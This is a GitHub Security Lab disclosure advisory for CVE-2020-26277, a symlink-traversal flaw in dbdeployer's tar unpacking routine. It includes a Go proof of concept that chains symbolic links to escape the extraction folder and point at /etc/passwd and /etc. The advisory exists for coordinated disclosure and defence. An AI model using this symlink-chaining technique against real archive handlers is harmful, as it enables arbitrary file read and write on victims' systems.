<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">January 12, 2021</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2020-256: Unsafe handling of symbolic links in dbdeployer unpacking routine - CVE-2020-26277</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/ghsecuritylab">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/61799930?s=35" height="35" width="35">
        <span>GitHub Security Lab</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      <h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>
<ul>
  <li>12/15/2020: reported to datacharmer@gmail.com</li>
  <li>12/15/2020: issue is acknowledged</li>
  <li>12/17/2020: version 1.58.2 is release containing a fix for this vulnerability</li>
</ul>

<h2 id="summary">Summary</h2>

<p>The unsafe handling of symbolic links in an unpacking routine may enable attackers to read and/or write to arbitrary locations outside the designated target folder.</p>

<h2 id="product">Product</h2>

<p>dbdeployer</p>

<h2 id="tested-version">Tested Version</h2>

<p>Latest commit at the time of reporting (November 27, 2020).</p>

<h2 id="details">Details</h2>

<h3 id="unsafe-handling-of-symbolic-links-in-unpacking-routine">Unsafe handling of symbolic links in unpacking routine</h3>

<p>The routine <a href="https://github.com/datacharmer/dbdeployer/blob/master/unpack/unpack.go#L169"><code class="language-plaintext highlighter-rouge">unpackTarFiles</code></a> attempts to guard against creating symbolic links that point outside the directory a tar archive is extracted to. However, a malicious tarball first linking  <code class="language-plaintext highlighter-rouge">subdir/parent</code> to <code class="language-plaintext highlighter-rouge">..</code> (allowed, because <code class="language-plaintext highlighter-rouge">subdir/..</code> falls within the archive root) and then linking <code class="language-plaintext highlighter-rouge">subdir/parent/escapes</code> to <code class="language-plaintext highlighter-rouge">..</code> results in a symbolic link pointing to the tarball’s parent directory, contrary to the routine’s goals.</p>

<p>Proof of concept, using a version of <code class="language-plaintext highlighter-rouge">unpackTarFiles</code> tweaked to accept an array of tar headers instead of working from an actual tar archive:</p>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">package</span> <span class="n">main</span>

<span class="k">import</span> <span class="p">(</span>
  <span class="s">"archive/tar"</span>
  <span class="s">"fmt"</span>
  <span class="s">"os"</span>
  <span class="s">"path"</span>
  <span class="s">"regexp"</span>
  <span class="s">"strings"</span>
<span class="p">)</span>

<span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
  <span class="k">var</span> <span class="n">headers</span> <span class="p">[]</span><span class="n">tar</span><span class="o">.</span><span class="n">Header</span> <span class="o">=</span> <span class="nb">make</span><span class="p">([]</span><span class="n">tar</span><span class="o">.</span><span class="n">Header</span><span class="p">,</span> <span class="m">3</span><span class="p">)</span>

  <span class="n">headers</span><span class="p">[</span><span class="m">0</span><span class="p">]</span><span class="o">.</span><span class="n">Name</span> <span class="o">=</span> <span class="s">"subdir/parent"</span>
  <span class="n">headers</span><span class="p">[</span><span class="m">0</span><span class="p">]</span><span class="o">.</span><span class="n">Linkname</span> <span class="o">=</span> <span class="s">".."</span>
  <span class="n">headers</span><span class="p">[</span><span class="m">0</span><span class="p">]</span><span class="o">.</span><span class="n">Typeflag</span> <span class="o">=</span> <span class="n">tar</span><span class="o">.</span><span class="n">TypeSymlink</span>

  <span class="n">headers</span><span class="p">[</span><span class="m">1</span><span class="p">]</span><span class="o">.</span><span class="n">Name</span> <span class="o">=</span> <span class="s">"subdir/parent/passwd"</span>
  <span class="n">headers</span><span class="p">[</span><span class="m">1</span><span class="p">]</span><span class="o">.</span><span class="n">Linkname</span> <span class="o">=</span> <span class="s">"../../etc/passwd"</span>
  <span class="n">headers</span><span class="p">[</span><span class="m">1</span><span class="p">]</span><span class="o">.</span><span class="n">Typeflag</span> <span class="o">=</span> <span class="n">tar</span><span class="o">.</span><span class="n">TypeSymlink</span>

  <span class="n">headers</span><span class="p">[</span><span class="m">2</span><span class="p">]</span><span class="o">.</span><span class="n">Name</span> <span class="o">=</span> <span class="s">"subdir/parent/etc"</span>
  <span class="n">headers</span><span class="p">[</span><span class="m">2</span><span class="p">]</span><span class="o">.</span><span class="n">Linkname</span> <span class="o">=</span> <span class="s">"../../etc"</span>
  <span class="n">headers</span><span class="p">[</span><span class="m">2</span><span class="p">]</span><span class="o">.</span><span class="n">Typeflag</span> <span class="o">=</span> <span class="n">tar</span><span class="o">.</span><span class="n">TypeSymlink</span>

  <span class="k">var</span> <span class="n">err</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">Chdir</span><span class="p">(</span><span class="s">"/tmp/extracthere"</span><span class="p">)</span>
  <span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
    <span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"error changing directory"</span><span class="p">)</span>
    <span class="k">return</span>
  <span class="p">}</span>
  <span class="n">unpackTarFiles</span><span class="p">(</span><span class="n">headers</span><span class="p">)</span>
<span class="p">}</span>


<span class="k">func</span> <span class="n">unpackTarFiles</span><span class="p">(</span><span class="n">headers</span> <span class="p">[]</span><span class="n">tar</span><span class="o">.</span><span class="n">Header</span><span class="p">)</span> <span class="p">(</span><span class="n">err</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">var</span> <span class="n">reSlash</span> <span class="o">=</span> <span class="n">regexp</span><span class="o">.</span><span class="n">MustCompile</span><span class="p">(</span><span class="s">`/.*`</span><span class="p">)</span>

  <span class="n">innerDir</span> <span class="o">:=</span> <span class="s">""</span>
  <span class="k">for</span> <span class="n">_</span><span class="p">,</span> <span class="n">header</span> <span class="o">:=</span> <span class="k">range</span> <span class="n">headers</span> <span class="p">{</span>
    <span class="n">filename</span> <span class="o">:=</span> <span class="n">sanitizedName</span><span class="p">(</span><span class="n">header</span><span class="o">.</span><span class="n">Name</span><span class="p">)</span>
    <span class="n">fileDir</span> <span class="o">:=</span> <span class="n">path</span><span class="o">.</span><span class="n">Dir</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
    <span class="n">upperDir</span> <span class="o">:=</span> <span class="n">reSlash</span><span class="o">.</span><span class="n">ReplaceAllString</span><span class="p">(</span><span class="n">fileDir</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">innerDir</span> <span class="o">!=</span> <span class="s">""</span> <span class="p">{</span>
      <span class="k">if</span> <span class="n">upperDir</span> <span class="o">!=</span> <span class="n">innerDir</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">fmt</span><span class="o">.</span><span class="n">Errorf</span><span class="p">(</span><span class="s">"found more than one directory inside the tarball</span><span class="se">\n</span><span class="s">"</span><span class="o">+</span>
          <span class="s">"&lt;%s&gt; and &lt;%s&gt;"</span><span class="p">,</span> <span class="n">upperDir</span><span class="p">,</span> <span class="n">innerDir</span><span class="p">)</span>
      <span class="p">}</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="n">innerDir</span> <span class="o">=</span> <span class="n">upperDir</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="n">_</span><span class="p">,</span> <span class="n">err</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">Stat</span><span class="p">(</span><span class="n">fileDir</span><span class="p">);</span> <span class="n">os</span><span class="o">.</span><span class="n">IsNotExist</span><span class="p">(</span><span class="n">err</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="n">err</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">MkdirAll</span><span class="p">(</span><span class="n">fileDir</span><span class="p">,</span> <span class="m">0755</span><span class="p">);</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">err</span>
      <span class="p">}</span>
      <span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">" + "</span><span class="o">+</span><span class="n">fileDir</span><span class="o">+</span><span class="s">" "</span><span class="p">)</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="n">header</span><span class="o">.</span><span class="n">Typeflag</span> <span class="o">==</span> <span class="m">0</span> <span class="p">{</span>
      <span class="n">header</span><span class="o">.</span><span class="n">Typeflag</span> <span class="o">=</span> <span class="n">tar</span><span class="o">.</span><span class="n">TypeReg</span>
    <span class="p">}</span>
    <span class="k">switch</span> <span class="n">header</span><span class="o">.</span><span class="n">Typeflag</span> <span class="p">{</span>
    <span class="k">case</span> <span class="n">tar</span><span class="o">.</span><span class="n">TypeDir</span><span class="o">:</span>
      <span class="k">if</span> <span class="n">err</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">MkdirAll</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="m">0755</span><span class="p">);</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">err</span>
      <span class="p">}</span>
    <span class="k">case</span> <span class="n">tar</span><span class="o">.</span><span class="n">TypeSymlink</span><span class="o">:</span>
      <span class="k">if</span> <span class="n">header</span><span class="o">.</span><span class="n">Linkname</span> <span class="o">!=</span> <span class="s">""</span> <span class="p">{</span>
        <span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="n">fmt</span><span class="o">.</span><span class="n">Sprintf</span><span class="p">(</span><span class="s">"%s -&gt; %s"</span><span class="p">,</span> <span class="n">filename</span><span class="p">,</span> <span class="n">header</span><span class="o">.</span><span class="n">Linkname</span><span class="p">))</span>
        <span class="n">err</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">Symlink</span><span class="p">(</span><span class="n">header</span><span class="o">.</span><span class="n">Linkname</span><span class="p">,</span> <span class="n">filename</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
          <span class="k">return</span> <span class="n">fmt</span><span class="o">.</span><span class="n">Errorf</span><span class="p">(</span><span class="s">"%#v</span><span class="se">\n</span><span class="s">#ERROR: %s"</span><span class="p">,</span> <span class="n">header</span><span class="p">,</span> <span class="n">err</span><span class="p">)</span>
        <span class="p">}</span>
      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">fmt</span><span class="o">.</span><span class="n">Errorf</span><span class="p">(</span><span class="s">"file %s is a symlink, but no link information was provided"</span><span class="p">,</span> <span class="n">filename</span><span class="p">)</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="no">nil</span>
<span class="p">}</span>

<span class="k">func</span> <span class="n">sanitizedName</span><span class="p">(</span><span class="n">filename</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">string</span> <span class="p">{</span>
  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span> <span class="o">&gt;</span> <span class="m">1</span> <span class="o">&amp;&amp;</span> <span class="n">filename</span><span class="p">[</span><span class="m">1</span><span class="p">]</span> <span class="o">==</span> <span class="sc">':'</span> <span class="p">{</span>
    <span class="n">filename</span> <span class="o">=</span> <span class="n">filename</span><span class="p">[</span><span class="m">2</span><span class="o">:</span><span class="p">]</span>
  <span class="p">}</span>
  <span class="n">filename</span> <span class="o">=</span> <span class="n">strings</span><span class="o">.</span><span class="n">TrimLeft</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">"</span><span class="se">\\</span><span class="s">/."</span><span class="p">)</span>
  <span class="n">filename</span> <span class="o">=</span> <span class="n">strings</span><span class="o">.</span><span class="n">Replace</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">"../"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="o">-</span><span class="m">1</span><span class="p">)</span>
  <span class="k">return</span> <span class="n">strings</span><span class="o">.</span><span class="n">Replace</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">"..</span><span class="se">\\</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="o">-</span><span class="m">1</span><span class="p">)</span>
<span class="p">}</span>

</code></pre></div></div>

<h4 id="impact">Impact</h4>

<p>This issue may lead to arbitrary file write (with same permissions as the program running the unpack operation) if the attacker can control the archive file. Additionally, if the attacker has read access to the unpacked files, he may be able to read arbitrary system files the parent process has permissions to read.</p>

<h2 id="cve">CVE</h2>
<ul>
  <li>CVE-2020-26277</li>
</ul>

<h2 id="resources">Resources</h2>
<ul>
  <li><a href="https://github.com/datacharmer/dbdeployer/security/advisories/GHSA-47wr-426j-fr82">GitHub Security Advisory</a></li>
</ul>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GitHub team member <a href="https://github.com/smowton">@smowton (Chris Smowton)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2020-256</code> in any communication regarding this issue.</p>

